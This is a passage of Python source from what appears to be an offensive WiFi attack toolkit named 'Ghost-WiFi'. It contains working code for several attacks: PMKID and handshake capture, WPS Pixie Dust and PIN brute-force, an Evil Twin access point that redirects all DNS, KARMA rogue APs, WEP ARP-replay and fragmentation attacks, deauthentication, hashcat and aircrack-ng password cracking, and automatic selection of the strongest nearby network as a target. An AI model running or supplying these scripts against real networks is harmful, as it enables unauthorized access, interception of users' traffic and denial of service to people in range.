    require_root()
    info("PMKID attack - clientless WPA2 key capture")

    if shutil.which("hcxdumptool") and shutil.which("hcxtools"):
        _pmkid_hcxtools(args)
    else:
        warn("hcxdumptool/hcxtools not found. Install for PMKID attack:")
        info("  sudo apt install hcxdumptool hcxtools")
        info("Attempting fallback with bettercap...")
        _pmkid_hint(args)

def _pmkid_hcxtools(args):
    mon = args.interface
    bssid = args.bssid
    out = args.output or "pmkid_capture.pcapng"
    filter_opt = f"--filterlist_ap={bssid.replace(':','').lower()} --filtermode=2" if bssid else ""
    duration = args.duration or 60

    info(f"Capturing PMKID on {mon} for {duration}s...")
    proc = subprocess.Popen(
        f"hcxdumptool -i {mon} -o {out} --enable_status=1 {filter_opt}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        time.sleep(duration)
    finally:
        proc.terminate()
        proc.wait()

    hash_file = out.replace(".pcapng", ".hc22000")
    run(f"hcxpcapngtool -o {hash_file} {out}")

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        ok(f"PMKID hashes saved: {hash_file}")
        ok(f"Crack with: hashcat -m 22000 {hash_file} wordlist.txt")
    else:
        warn(f"No PMKID hashes captured. Try longer duration or move closer to AP.")

def _pmkid_hint(args):
    warn("Manual PMKID capture commands:")
    print(f"""
  # With bettercap:
  sudo bettercap -iface {args.interface or 'wlan0mon'}
  > wifi.recon on
  > wifi.assoc all

  # Convert pcap to hashcat format:
  hcxpcapngtool -o hashes.hc22000 capture.pcapng

  # Crack:
  hashcat -m 22000 hashes.hc22000 wordlist.txt
""")

# ─── Module: wps ──────────────────────────────────────────────────────────────

def cmd_wps(args):
    if not args.no_banner:
        print_banner()
    require_root()
    bssid = args.bssid
    iface = args.interface
    channel = args.channel or 1

    if args.action == "scan":
        require_tool("wash")
        info(f"Scanning for WPS-enabled APs on {iface}...")
        out, _, _ = run(f"wash -i {iface} 2>/dev/null", timeout=30)
        print(out)

    elif args.action == "pixie":
        require_tool("reaver")
        info(f"WPS Pixie Dust attack on {bssid}...")
        warn("This may take several minutes.")
        out, _, rc = run(
            f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv",
            capture=False, timeout=600
        )

    elif args.action == "pin":
        require_tool("reaver")
        pin = args.pin or ""
        pin_opt = f"-p {pin}" if pin else ""
        info(f"WPS PIN brute-force on {bssid}...")
        warn("This is slow (may take hours). Use Pixie Dust first.")
        try:
            subprocess.run(
                f"reaver -i {iface} -b {bssid} -c {channel} {pin_opt} -vv",
                shell=True, timeout=3600
            )
        except KeyboardInterrupt:
            info("WPS PIN attack interrupted.")

    elif args.action == "bully":
        if shutil.which("bully"):
            info(f"Bully WPS attack on {bssid}...")
            try:
                subprocess.run(
                    f"bully {iface} -b {bssid} -c {channel} -d",
                    shell=True
                )
            except KeyboardInterrupt:
                pass
        else:
            warn("bully not found. Install: sudo apt install bully")

# ─── Module: evil-twin ────────────────────────────────────────────────────────

def cmd_eviltwin(args):
    if not args.no_banner:
        print_banner()
    require_root()
    essid = args.essid
    bssid = args.bssid
    iface = args.interface
    channel = args.channel or 6

    info(f"Setting up Evil Twin AP: {essid} (channel {channel})")

    if shutil.which("hostapd") and shutil.which("dnsmasq"):
        _eviltwin_hostapd(iface, essid, channel, bssid, args)
    else:
        warn("hostapd/dnsmasq not found. Install for Evil Twin:")
        info("  sudo apt install hostapd dnsmasq")
        _eviltwin_hint(iface, essid, channel)

def _eviltwin_hostapd(iface, essid, channel, bssid, args):
    hostapd_conf = f"""\
interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    dnsmasq_conf = f"""\
interface={iface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
    conf_dir = tempfile.mkdtemp(prefix="/tmp/ghostwifi_")
    hconf = f"{conf_dir}/hostapd.conf"
    dconf = f"{conf_dir}/dnsmasq.conf"

    with open(hconf, "w") as f:
        f.write(hostapd_conf)
    with open(dconf, "w") as f:
        f.write(dnsmasq_conf)

    run(f"ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
    run("iptables -t nat -A POSTROUTING -j MASQUERADE")
    run("echo 1 > /proc/sys/net/ipv4/ip_forward")

    ok(f"Evil Twin AP '{essid}' starting on {iface} channel {channel}")
    info(f"Config: {hconf}")
    info("Press Ctrl+C to stop...")

    procs = []
    try:
        procs.append(subprocess.Popen(f"dnsmasq -C {dconf} -d", shell=True))
        procs.append(subprocess.Popen(f"hostapd {hconf}", shell=True))
        signal.pause()
    except (KeyboardInterrupt, AttributeError):
        for p in procs:
            p.terminate()
        run("iptables -t nat -F")
        run("echo 0 > /proc/sys/net/ipv4/ip_forward")
        ok("Evil Twin stopped.")

def _eviltwin_hint(iface, essid, channel):
    print(f"""
  Manual Evil Twin setup:

  # hostapd.conf:
  interface={iface}
  ssid={essid}
  channel={channel}
  hw_mode=g

  # Run:
  sudo hostapd /tmp/hostapd.conf
  sudo dnsmasq --interface={iface} --dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h

  # Or use airbase-ng:
  sudo airbase-ng -e "{essid}" -c {channel} {iface}
""")

# ─── Module: crack ────────────────────────────────────────────────────────────

_RULE_PRESETS = {
    "append-digits":   "?d?d, ?d?d?d, ?d?d?d?d (append 2-4 digits)",
    "capitalize":      "Toggle first letter uppercase",
    "leet":            "a->4, e->3, i->1, o->0 substitution",
    "combo":           "Wordlist + wordlist combination attack",
    "best64":          "Best64 hashcat rules (high coverage)",
}

_HASHCAT_RULES_PATHS = [
    "/usr/share/hashcat/rules/best64.rule",
    "/usr/share/doc/hashcat/examples/rules/best64.rule",
    "/opt/hashcat/rules/best64.rule",
]

def _detect_gpu():
    """Check for CUDA/OpenCL GPU available to hashcat."""
    out, _, rc = run("hashcat -I 2>/dev/null", timeout=10)
    if rc == 0 and ("cuda" in out.lower() or "opencl" in out.lower() or "device #" in out.lower()):
        lines = [l.strip() for l in out.splitlines() if "Device #" in l or "device #" in l.lower()]
        return True, lines[:3]
    return False, []

def cmd_crack(args):
    if not args.no_banner:
        print_banner()
    cap = args.cap
    wordlist = args.wordlist
    essid = args.essid or ""

    if not os.path.exists(cap):
        err(f"Capture file not found: {cap}")
        sys.exit(1)

    attack_mode = getattr(args, "attack_mode", "wordlist")

    if attack_mode == "mask":
        _crack_hashcat_mask(args)
    elif attack_mode == "combo":
        _crack_hashcat_combo(args)
    elif attack_mode == "john":
        _crack_john(cap, wordlist, essid, args)
    elif args.hashcat:
        _crack_hashcat(args)
    else:
        _crack_aircrack(cap, wordlist, essid, args)

def _crack_aircrack(cap, wordlist, essid, args):
    require_tool("aircrack-ng")
    essid_opt = f'-e "{essid}"' if essid else ""

    info(f"Cracking {cap} with aircrack-ng...")
    if not wordlist:
        warn("No wordlist specified. Using built-in mini-list.")
        wl_path = tempfile.mktemp(suffix=".txt")
        with open(wl_path, "w") as f:
            f.write("\n".join(MINI_WORDLIST))
        wordlist = wl_path

    cmd_str = f"aircrack-ng {essid_opt} -w {wordlist} {cap}"
    out, _, rc = run(cmd_str, timeout=3600)
    print(out)
    m = re.search(r"KEY FOUND! \[ (.+?) \]", out)
    if m:
        ok(f"Password found: {m.group(1)}")
    else:
        warn("Password not found with this wordlist.")
        info("Try: ghost-wifi.py crack --cap capture.cap --wordlist /usr/share/wordlists/rockyou.txt")
        info("Or: ghost-wifi.py crack --cap capture.cap --hashcat --attack-mode mask --mask '?d?d?d?d?d?d?d?d'")

def _crack_hashcat(args):
    require_tool("hashcat")
    hfile = args.cap
    wordlist = args.wordlist or "/usr/share/wordlists/rockyou.txt"
    mode = args.hash_mode or 22000
    pot = "/tmp/ghostwifi.pot"

    # GPU check
    has_gpu, gpu_devs = _detect_gpu()
    if has_gpu:
        ok(f"GPU detected: {'; '.join(gpu_devs) if gpu_devs else 'yes'}")
    else:
        warn("No GPU detected - falling back to CPU (slow). Consider using a GPU machine.")

    # Rules
    rules_opt = ""
    if getattr(args, "rules", None):
        rules_opt = f"-r {args.rules}"
    elif getattr(args, "rule_preset", None):
        preset = args.rule_preset
        if preset == "best64":
            for rp in _HASHCAT_RULES_PATHS:
                if os.path.exists(rp):
                    rules_opt = f"-r {rp}"
                    info(f"Using best64 rules: {rp}")
                    break
            else:
                warn("best64.rule not found. Install hashcat package.")
        elif preset == "append-digits":
            rules_opt = "--increment --increment-min=1 --increment-max=4"
        info(f"Rule preset: {preset}")

    info(f"Cracking with hashcat -m {mode}...")
    cmd_str = f"hashcat -m {mode} -a 0 {hfile} {wordlist} {rules_opt} --status --potfile-path {pot}"
    try:
        subprocess.run(cmd_str, shell=True)
    except KeyboardInterrupt:
        pass
    out, _, _ = run(f"hashcat -m {mode} {hfile} --show --potfile-path {pot}")
    if out.strip():
        ok("Cracked hashes:")
        print(out)
    else:
        warn("No hashes cracked with this wordlist/rules.")
        info("Next: try mask attack -- ghost-wifi.py crack --cap file --hashcat --attack-mode mask --mask '?d?d?d?d?d?d?d?d'")

def _crack_hashcat_mask(args):
    """Hashcat mask attack (-a 3)."""
    require_tool("hashcat")
    hfile = args.cap
    mode = args.hash_mode or 22000
    pot = "/tmp/ghostwifi.pot"
    mask = getattr(args, "mask", None) or "?d?d?d?d?d?d?d?d"

    info(f"Mask attack: hashcat -m {mode} -a 3 '{mask}'")
    info("Charset: ?l=lowercase ?u=upper ?d=digit ?s=special ?a=all")
    has_gpu, _ = _detect_gpu()
    if not has_gpu:
        warn("CPU-only: mask attack will be very slow without GPU.")

    cmd_str = f"hashcat -m {mode} -a 3 {hfile} '{mask}' --status --potfile-path {pot}"
    try:
        subprocess.run(cmd_str, shell=True)
    except KeyboardInterrupt:
        pass
    out, _, _ = run(f"hashcat -m {mode} {hfile} --show --potfile-path {pot}")
    if out.strip():
        ok("Cracked:")
        print(out)

def _crack_hashcat_combo(args):
    """Hashcat combination attack (-a 1): two wordlists combined."""
    require_tool("hashcat")
    hfile = args.cap
    mode = args.hash_mode or 22000
    pot = "/tmp/ghostwifi.pot"
    wl1 = args.wordlist or "/usr/share/wordlists/rockyou.txt"
    wl2 = getattr(args, "wordlist2", None) or wl1

    info(f"Combo attack: {wl1} + {wl2}")
    cmd_str = f"hashcat -m {mode} -a 1 {hfile} {wl1} {wl2} --status --potfile-path {pot}"
    try:
        subprocess.run(cmd_str, shell=True)
    except KeyboardInterrupt:
        pass
    out, _, _ = run(f"hashcat -m {mode} {hfile} --show --potfile-path {pot}")
    if out.strip():
        ok("Cracked:")
        print(out)

def _crack_john(cap, wordlist, essid, args):
    """Crack with John the Ripper (hcap format)."""
    if not shutil.which("john"):
        err("john not found. Install: sudo apt install john")
        info("Fallback: use --hashcat flag for hashcat")
        return
    # john needs .hccap or .hcwpax format
    hccap = cap.replace(".cap", ".hccap")
    if not os.path.exists(hccap):
        if shutil.which("hcxpcapngtool"):
            run(f"hcxpcapngtool -o {cap.replace('.cap', '.hc22000')} {cap}")
        if shutil.which("cap2hccapx"):
            run(f"cap2hccapx {cap} {hccap}")
        elif shutil.which("aircrack-ng"):
            # aircrack can convert
            run(f"aircrack-ng {cap} -J {cap.replace('.cap', '')} 2>/dev/null")
            hccap = cap.replace(".cap", ".hccap")
    if not os.path.exists(hccap):
        warn(f"Could not convert {cap} to hccap for John. Trying direct .cap...")
        hccap = cap

    wl_opt = f"--wordlist={wordlist}" if wordlist else ""
    info(f"Cracking with John the Ripper ({hccap})...")
    try:
        subprocess.run(f"john {wl_opt} {hccap}", shell=True)
    except KeyboardInterrupt:
        pass
    out, _, _ = run(f"john --show {hccap}")
    if out.strip():
        ok("John results:")
        print(out)

# ─── Module: wep ──────────────────────────────────────────────────────────────

def cmd_wep(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng", "aireplay-ng", "aircrack-ng")
    mon = args.interface
    bssid = args.bssid
    channel = args.channel or 1
    out = args.output or f"wep_{bssid.replace(':','')}"

    info(f"WEP attack on {bssid} (channel {channel})")
    run(f"iwconfig {mon} channel {channel}")

    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {out} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    if args.attack == "arp":
        info("ARP replay attack...")
        # First do fake authentication
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        time.sleep(2)
        try:
            subprocess.run(
                f"aireplay-ng -3 -b {bssid} {mon}",
                shell=True, timeout=600
            )
        except KeyboardInterrupt:
            pass

    elif args.attack == "frag":
        info("Fragmentation attack...")
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        try:
            subprocess.run(f"aireplay-ng -5 -b {bssid} {mon}", shell=True, timeout=120)
        except KeyboardInterrupt:
            pass
        # Forge ARP
        if shutil.which("packetforge-ng"):
            run(f"packetforge-ng -0 -a {bssid} -k 255.255.255.255 -l 255.255.255.255 -y replay_dec*.xor -w forged.cap")
            try:
                subprocess.run(f"aireplay-ng -2 -r forged.cap {mon}", shell=True, timeout=600)
            except KeyboardInterrupt:
                pass

    elif args.attack == "chopchop":
        info("ChopChop attack...")
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        try:
            subprocess.run(f"aireplay-ng -4 -b {bssid} {mon}", shell=True, timeout=180)
        except KeyboardInterrupt:
            pass

    proc.terminate()
    cap = f"{out}-01.cap"
    info(f"Attempting to crack WEP key from {cap}...")
    out_crack, _, _ = run(f"aircrack-ng {cap}", timeout=120)
    print(out_crack)
    m = re.search(r"KEY FOUND! \[ (.+?) \]", out_crack)
    if m:
        ok(f"WEP key: {m.group(1)}")

# ─── Module: clients ──────────────────────────────────────────────────────────

def cmd_clients(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    bssid = args.bssid
    channel = args.channel

    if channel:
        run(f"iwconfig {mon} channel {channel}")

    duration = args.duration or 30
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_clients_")

    info(f"Tracking clients on {mon} for {duration}s...")
    bssid_opt = f"--bssid {bssid}" if bssid else ""
    ch_opt = f"-c {channel}" if channel else ""

    proc = subprocess.Popen(
        f"airodump-ng {bssid_opt} {ch_opt} -w {out_prefix} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()

    csv = f"{out_prefix}-01.csv"
    if os.path.exists(csv):
        _, clients = _parse_airodump_csv(csv)
        print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'BSSID':<19} PROBED ESSIDs{RST}")
        print("-" * 70)
        for c in clients:
            print(f"  {c['mac']:<19} {c['power']:<5} {c['bssid']:<19} {c['probed_essids']}")
        ok(f"Found {len(clients)} clients")
        if args.output:
            save_json({"clients": clients}, args.output)

    for f in Path("/tmp").glob("ghostwifi_clients_*"):
        f.unlink(missing_ok=True)

# ─── Module: karma ────────────────────────────────────────────────────────────

def cmd_karma(args):
    if not args.no_banner:
        print_banner()
    require_root()
    info("KARMA attack - respond to all probe requests with matching AP")

    if shutil.which("hostapd-wpe"):
        info(f"Using hostapd-wpe on {args.interface}...")
        subprocess.run(f"hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", shell=True)
    elif shutil.which("bettercap"):
        info("Using bettercap for KARMA attack...")
        script = "wifi.recon on; set wifi.ap.ssid .; wifi.ap on"
        subprocess.run(
            f"bettercap -iface {args.interface} -eval '{script}'",
            shell=True
        )
    else:
        warn("No KARMA tool found. Install hostapd-wpe or bettercap:")
        info("  sudo apt install bettercap")
        print(f"""
  Manual KARMA with airbase-ng:
  sudo airbase-ng -P -C 30 -e "" {args.interface}
  (-P = respond to all probes, -C = respond to broadcast probes for 30s)
""")

# ─── Module: handshake tools ──────────────────────────────────────────────────

def cmd_handshake(args):
    if not args.no_banner:
        print_banner()
    cap = args.cap

    if args.action == "verify":
        require_tool("aircrack-ng")
        out, _, _ = run(f"aircrack-ng {cap} 2>&1")
        if "handshake" in out.lower():
            ok(f"Valid handshake found in {cap}")
        else:
            warn(f"No valid handshake detected in {cap}")
        print(out[:500])

    elif args.action == "convert":
        if shutil.which("hcxpcapngtool"):
            out_hc = args.output or cap.replace(".cap", ".hc22000")
            run(f"hcxpcapngtool -o {out_hc} {cap}")
            ok(f"Converted to hashcat format: {out_hc}")
        elif shutil.which("cap2hccapx"):
            out_hc = args.output or cap.replace(".cap", ".hccapx")
            run(f"cap2hccapx {cap} {out_hc}")
            ok(f"Converted: {out_hc}")
        else:
            warn("hcxpcapngtool/cap2hccapx not found.")
            info("Install: sudo apt install hcxtools")

    elif args.action == "strip":
        # Remove non-handshake packets
        if shutil.which("wpaclean"):
            out_clean = args.output or cap.replace(".cap", "_clean.cap")
            run(f"wpaclean {out_clean} {cap}")
            ok(f"Cleaned capture: {out_clean}")
        else:
            warn("wpaclean not found (part of aircrack-ng suite)")

# ─── Module: info ─────────────────────────────────────────────────────────────

def cmd_info(args):
    if not args.no_banner:
        print_banner()
    print(f"\n{W}Ghost-WiFi Dependency Check{RST}\n")
    tools = {
        "aircrack-ng": ("Core - WEP/WPA cracking", True),
        "airodump-ng": ("Core - packet capture/scan", True),
        "aireplay-ng": ("Core - injection/deauth", True),
        "airmon-ng":   ("Core - monitor mode", True),
        "airbase-ng":  ("Core - AP emulation", False),
        "wash":        ("WPS - scan for WPS APs", False),
        "reaver":      ("WPS - Pixie Dust/PIN brute", False),
        "bully":       ("WPS - alternative WPS attack", False),
        "hcxdumptool": ("PMKID - clientless capture", False),
        "hcxpcapngtool":("PMKID - convert to hashcat", False),
        "hashcat":     ("Cracking - GPU acceleration", False),
        "john":        ("Cracking - CPU-based cracking", False),
        "hostapd":     ("Evil Twin/KARMA - AP daemon", False),
        "dnsmasq":     ("Evil Twin - DHCP/DNS server", False),
        "bettercap":   ("KARMA/MITM - all-in-one framework", False),
        "iw":          ("WiFi management", True),
        "iwconfig":    ("WiFi config (legacy)", False),
        "macchanger":  ("MAC address spoofing", False),
        "wireshark":   ("Packet analysis", False),
        "tshark":      ("CLI packet analysis", False),
        "mdk4":        ("Advanced DoS - beacon/deauth/auth flood", False),
        "mdk3":        ("MDK3 legacy (use mdk4 when possible)", False),
        "ethtool":     ("Driver info for NIC detection", False),
        "lsusb":       ("USB device enumeration (NIC detect)", False),
        "lspci":       ("PCI device enumeration (NIC detect)", False),
        "iw":          ("WiFi management (required for nic-detect)", True),
    }
    for tool, (desc, required) in tools.items():
        found = shutil.which(tool) is not None
        status = f"{G}[OK]{RST}" if found else (f"{R}[MISSING - required]{RST}" if required else f"{Y}[not found]{RST}")
        print(f"  {status} {tool:<20} {DIM}{desc}{RST}")

    print(f"\n{W}Install missing tools:{RST}")
    print("  sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools hashcat hostapd dnsmasq bettercap macchanger mdk4 ethtool")
    print(f"\n{W}Ghost-WiFi v3.0.0 new modules:{RST}")
    new_mods = [
        ("nic-detect",      "Deep NIC analysis: chipset, bands, injection, TX power"),
        ("beacon-flood",    "Flood with fake beacon frames (mdk4/airbase-ng)"),
        ("probe-hunt",      "Capture probe requests + OUI device fingerprinting"),
        ("captive-portal",  "Python HTTP captive portal for credential capture"),
        ("mdk4",            "MDK4 wrapper: beacon/deauth/auth-DoS/probe/EAPOL/TKIP"),
        ("fingerprint",     "AP + client fingerprinting with vendor lookup"),
        ("injection-test",  "Test packet injection capability per interface"),
        ("channelfix",      "Force specific channel on interface"),
        ("5ghz-scan",       "Dedicated 5GHz band scan"),
    ]
    for mod, desc in new_mods:
        print(f"  {C}[NEW]{RST} {mod:<18} {DIM}{desc}{RST}")

# ─── MAC randomization helper ────────────────────────────────────────────────

def mac_randomize(interface):
    import random
    if shutil.which("macchanger"):
        out, _, rc = run(f"macchanger -r {interface}")
        m = re.search(r"New MAC:\s+([\da-f:]+)", out, re.I)
        if rc == 0 and m:
            ok(f"MAC randomized -> {m.group(1)}")
            return m.group(1)
    # manual fallback
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    run(f"ip link set {interface} down")
    run(f"ip link set {interface} address {mac}")
    run(f"ip link set {interface} up")
    ok(f"MAC set to {mac} (manual)")
    return mac


# ─── Module: auto-attack ──────────────────────────────────────────────────────

def cmd_auto(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng", "aireplay-ng")
    mon = args.interface

    if args.mac_rand:
        mac_randomize(mon)

    # Step 1: scan
    info(f"[1/3] Scanning {args.scan_time}s to discover targets...")
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostauto_")
    band_opt = f"--band {args.band}" if args.band else ""
    proc = subprocess.Popen(
        f"airodump-ng {mon} {band_opt} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(args.scan_time)
    proc.terminate(); proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    aps, _ = _parse_airodump_csv(csv_file) if os.path.exists(csv_file) else ([], [])

    if not aps:
        err("No APs found during scan."); return

    # Filter by encryption
    targets = [ap for ap in aps if args.target_enc in ap.get("privacy", "")]
    if not targets:
        warn(f"No {args.target_enc} networks found. Showing all APs:")
        targets = aps

    _print_scan_results(targets, [], args.verbose)

    # Step 2: pick target
    if args.bssid:
        target = next((a for a in targets if a["bssid"].lower() == args.bssid.lower()), None)
        if not target:
            err(f"BSSID {args.bssid} not found in scan."); return
    else:
        # pick strongest signal
        def pwr(ap):
            try: return int(ap["power"])
            except: return -99
        target = sorted(targets, key=pwr, reverse=True)[0]

    ok(f"[2/3] Target: {target['essid']} ({target['bssid']}) CH:{target['channel']} ENC:{target['privacy']}")

    if target.get("privacy", "").upper() in ("WPA3", "SAE"):
        warn("WPA3/SAE detected - deauth may not force reconnect; using passive capture.")
        args.passive = True

    channel = int(target["channel"]) if target["channel"].strip().isdigit() else 1
    run(f"iwconfig {mon} channel {channel}")

    # Step 3: capture
    info("[3/3] Capturing handshake...")
    cap_prefix = args.output or f"auto_{target['bssid'].replace(':','')}"
    cap_proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {target['bssid']} -w {cap_prefix} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    handshake = False
    for i in range(args.deauth_rounds):
        if not getattr(args, "passive", False):
            run(f"aireplay-ng --deauth 5 -a {target['bssid']} {mon}", timeout=10)
        time.sleep(4)
        cap_file = f"{cap_prefix}-01.cap"
        if os.path.exists(cap_file):
            out2, _, _ = run(f"aircrack-ng {cap_file} 2>&1 | grep -i handshake")
            if "handshake" in out2.lower():
                handshake = True
                break

    cap_proc.terminate(); cap_proc.wait()
    cap_file = f"{cap_prefix}-01.cap"

    if handshake:
        ok(f"Handshake captured: {cap_file}")
        ok(f"Next: ghost-wifi.py crack --cap {cap_file} --wordlist rockyou.txt")
    else:
        warn(f"Handshake not confirmed. File: {cap_file}")
        # PMKID fallback
        if getattr(args, "pmkid_fallback", True) and shutil.which("hcxdumptool"):
            info("[4/4] Trying PMKID fallback (clientless)...")
            pmkid_file = f"{cap_prefix}_pmkid.pcapng"
            pmkid_hash = f"{cap_prefix}_pmkid.hc22000"
            pmkid_proc = subprocess.Popen(
                f"hcxdumptool -i {mon} -o {pmkid_file} --filterlist_ap={target['bssid'].replace(':','').lower()} --filtermode=2 --enable_status=1",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(30)
            pmkid_proc.terminate(); pmkid_proc.wait()
            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
                run(f"hcxpcapngtool -o {pmkid_hash} {pmkid_file}")
                if os.path.exists(pmkid_hash) and os.path.getsize(pmkid_hash) > 0:
                    ok(f"PMKID hash saved: {pmkid_hash}")
                    ok(f"Crack: hashcat -m 22000 {pmkid_hash} wordlist.txt")
                else:
                    warn("PMKID capture produced no hashes. AP may not be vulnerable.")
            else:
                warn("PMKID capture empty. Try longer duration or move closer to AP.")
        elif not shutil.which("hcxdumptool"):
            info("Tip: install hcxdumptool for PMKID fallback (clientless attack)")

    for f in Path("/tmp").glob("ghostauto_*"):
        try: f.unlink()
        except: pass


# ─── Module: decloak (hidden SSID detection) ──────────────────────────────────

def cmd_decloak(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    duration = args.duration or 60

    info(f"Listening for probe responses to de-cloak hidden SSIDs ({duration}s)...")
    info("Probe requests from clients will reveal hidden SSIDs.")
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostdecloak_")
    proc = subprocess.Popen(
        f"airodump-ng {mon} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate(); proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err("No capture file created."); return

    aps, clients = _parse_airodump_csv(csv_file)
    hidden = [ap for ap in aps if not ap.get("essid") or ap["essid"] == ""]
    probed = {}
    for c in clients:
        if c.get("probed_essids"):
            bssid = c["bssid"].strip()
            for ssid in c["probed_essids"].split(","):
                ssid = ssid.strip()
                if ssid and ssid not in ("", " "):
                    probed.setdefault(bssid, set()).add(ssid)

    print(f"\n{W}Hidden APs detected: {len(hidden)}{RST}")
    resolved = 0
    for ap in hidden:
        bssid = ap["bssid"]
        ssids = probed.get(bssid, set())
        if ssids:
            ok(f"{bssid} CH:{ap['channel']} -> SSID: {', '.join(ssids)}")
            resolved += 1
        else:
            warn(f"{bssid} CH:{ap['channel']} -> SSID: [not yet revealed - no probes seen]")

    info(f"De-cloaked {resolved}/{len(hidden)} hidden networks.")
    if resolved < len(hidden):
        info("Tip: Send deauth to hidden AP clients to force probe requests.")

    if args.output:
        result = [{"bssid": ap["bssid"], "channel": ap["channel"],
                   "ssids": list(probed.get(ap["bssid"], []))} for ap in hidden]
        save_json({"hidden_aps": result}, args.output)

    for f in Path("/tmp").glob("ghostdecloak_*"):
        try: f.unlink()
        except: pass


# ─── Module: eapol re-injection ───────────────────────────────────────────────

def cmd_eapol(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("aireplay-ng")
    mon = args.interface
    bssid = args.bssid
    cap_file = args.cap

    if not os.path.exists(cap_file):
        err(f"Capture file not found: {cap_file}"); return

    if args.channel:
        run(f"iwconfig {mon} channel {args.channel}")
        ok(f"Set channel {args.channel}")

    info(f"Re-injecting EAPOL from {cap_file} to {bssid}...")
    info("This forces clients to re-authenticate, increasing chance of capturing handshake.")

    for i in range(args.count):
        info(f"Injection round {i+1}/{args.count}")
        run(f"aireplay-ng --deauth 3 -a {bssid} {mon}", timeout=10)
        time.sleep(2)
        # inject from capture file
        _, _, rc = run(f"aireplay-ng -2 -b {bssid} -r {cap_file} {mon}", timeout=15)
        if rc == 0:
            ok(f"Round {i+1}: EAPOL frames injected")
        time.sleep(args.interval)

    ok("EAPOL re-injection complete.")


# ─── Module: signal tracking ──────────────────────────────────────────────────

def cmd_signal(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("iw")
    mon = args.interface
    bssid = args.bssid
    duration = args.duration or 30
    interval = args.interval or 2

    info(f"Tracking signal for {bssid} on {mon} ({duration}s, {interval}s interval)...")
    readings = []
    start = time.time()
    try:
        while time.time() - start < duration:
            out, _, _ = run(f"iw dev {mon} scan flush 2>/dev/null | grep -A5 {bssid}")
            sig = re.search(r"signal:\s*([-\d.]+)", out)
            if sig:
                val = float(sig.group(1))
                ts = datetime.now().strftime("%H:%M:%S")
                bar_len = max(0, min(40, int((val + 100) * 0.8)))
                bar = f"{G}{'|' * bar_len}{RST}{'.' * (40 - bar_len)}"
                print(f"\r  {ts}  {bssid}  [{bar}] {val:.1f} dBm   ", end="", flush=True)
                readings.append({"time": ts, "signal": val})
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    print()

    if readings:
        avg = sum(r["signal"] for r in readings) / len(readings)
        mn = min(r["signal"] for r in readings)
        mx = max(r["signal"] for r in readings)
        ok(f"Signal stats - Avg: {avg:.1f} dBm  Min: {mn:.1f}  Max: {mx:.1f}  Samples: {len(readings)}")
        if args.output:
            save_json({"bssid": bssid, "readings": readings, "avg": avg, "min": mn, "max": mx}, args.output)
    else:
        warn(f"No signal readings for {bssid}. Is the AP in range?")


# ─── Module: nic-detect ───────────────────────────────────────────────────────

def cmd_nic_detect(args):
    """Deep NIC capability detection: chipset, injection, bands, TX power, bus type."""
    if not args.no_banner:
        print_banner()
    ifaces = get_interfaces()
    if args.interface:
        ifaces = [args.interface]
    if not ifaces:
        warn("No wireless interfaces found.")
        return

    results = []
    for iface in ifaces:
        info(f"Analyzing {iface}...")
        rec = {"interface": iface}

        # Basic info
        out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
        mode = re.search(r"type (\S+)", out)
        rec["mode"] = mode.group(1) if mode else "unknown"
        mac_m = re.search(r"addr ([\da-f:]+)", out)
        rec["mac"] = mac_m.group(1) if mac_m else "unknown"
        rec["vendor"] = _oui_vendor(rec["mac"])

        # Driver + chipset
        drv = _get_driver(iface)
        rec["driver"] = drv or "unknown"
        rec["chipset"] = _DRIVER_CHIPSET.get(drv, f"({drv or 'unknown'})") if drv else "unknown"

        # Bus type + USB details
        bus = _bus_type(iface)
        rec["bus"] = bus
        if bus == "USB":
            usb_info = _usb_device_info(iface)
            if usb_info:
                rec["usb_device"] = usb_info

        # TX power
        txpwr = _tx_power(iface)
        rec["tx_power_dbm"] = txpwr

        # PHY name
